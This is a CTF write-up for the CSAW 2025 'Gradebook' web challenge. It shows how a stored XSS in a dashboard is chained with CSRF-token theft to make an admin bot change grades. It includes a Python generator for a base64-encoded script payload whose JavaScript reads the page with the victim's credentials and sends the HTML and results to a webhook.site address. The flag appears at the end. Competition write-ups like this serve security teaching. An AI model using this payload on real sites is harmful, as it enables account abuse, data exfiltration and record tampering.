# CTF Competition: CSAW 2025 Quals

### CTF Name: Gradebook
**CTF Weight:** 477 points ~ 64 solves

<img width="664" height="416" alt="image" src="https://github.com/user-attachments/assets/ab144e77-7118-427e-917b-882e9d252f4d" />


## Writeup:
This challenge requires tests your csrf hacking.

You are given an admin bot (big clue its csrf) and an account with very bad grades : (

<img width="1865" height="684" alt="image" src="https://github.com/user-attachments/assets/f697cc86-6819-438b-b59c-11fea88abb08" />

as you can see I have a bunch of D's  : (.

So looking at the source code, I see that in order to hit the `/change-grade` endpoint I have to send a post request with the:
```
student_id = request.form.get('student_id')  
class_id = request.form.get('class_id')
new_grade = request.form.get('grade')
csrf_token = request.form.get('csrf_token')
```
As a student I have the student_id, class_id, and new_grade which I will always set to "A".

The CSRF token, however, I do not have and only the teachers are able to access the `/change-grade` endpoint.

<img width="999" height="1030" alt="image" src="https://github.com/user-attachments/assets/a259cbe0-48aa-4a3c-8722-e07086ca4383" />


Also tried initially to brute forcing the flask-key to see if I could cheese it (didn't work lol).

<img width="943" height="157" alt="image" src="https://github.com/user-attachments/assets/716f57ad-c272-4ad6-879c-00102934a673" />


So we have to be careful when crafting the CSRF payload because of CORs and SOP. So we have to bounce the request from the `/dashboard` endpoint.
Foutunatley there is a xss vulnerability in the `/dashboard` endpoint which allows me to inject XSS!!!! inline scripts are not allowed, but I am able to exscape it though base64 encoding it.

Sooo.. our script needs to first submit a GET request to the `/get-dashboard` endpoint and then extract the CSRF token. Once we extract this, we submit the post request and join it with the other attributes:

```
import base64

class_ids = [
    "93bf63a7-c8ad-4092-bd32-136944ad9584",
    "bb7b4ab6-7e43-4e04-914d-f1c5f897dfa5",
    "d9c836fd-a5ca-4d44-a241-e8428447e5cf",
    "8938a046-e7c5-4402-84b7-36980f2eede6",
    "278614a5-3c34-41a9-9e30-3f4b0b621f9b"
]

student_id = "757729e2-45e5-4dfb-be55-814da78f4936"


def generate_xss_payload():
    # Your exact JavaScript code
    js_code = """
fetch('https://gradebook-app.ctf.csaw.io/grade-change',{method:'GET',credentials:'include'})
.then(r=>r.text())
.then(d=>{
    new Image().src='https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?html='+btoa(d);
    const t=new DOMParser().parseFromString(d,'text/html').querySelector('input[name="csrf_token"]').value;
    fetch('https://gradebook-app.ctf.csaw.io/grade-change',{
        method:'POST',
        credentials:'include',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:new URLSearchParams({
            csrf_token:t,
            student_id:'757729e2-45e5-4dfb-be55-814da78f4936',
            class_id:'8938a046-e7c5-4402-84b7-36980f2eede6',
            grade:'A'
        })
    }).then(r=>r.text()).then(r=>{new Image().src='https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?result='+btoa(r)})
})
.catch(err=>{
    new Image().src='https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?error='+btoa(err.message)
});
"""
    js_code = ' '.join(js_code.split()).replace(' {', '{').replace(' }', '}')
    js_b64 = base64.b64encode(js_code.encode('utf-8')).decode('ascii')
    payload = f'</textarea><script src="data:application/javascript;base64,{js_b64}"></script>'
    return payload


xss_payload = generate_xss_payload()
print(xss_payload)

```

Inject this into each of the textboxes to change your grades 1 by 1 to be all As

: )

<img width="916" height="628" alt="image" src="https://github.com/user-attachments/assets/b201e952-83bd-4ed1-b34e-d3e5ccad137b" />

<img width="743" height="158" alt="Screenshot from 2025-09-13 19-29-15" src="https://github.com/user-attachments/assets/fc48b6af-d8de-4a4e-9eab-db9b5d0b06b9" />


flag: `csawctf{y0u_m@de_the_h@cking_h0n0r_r0ll}`
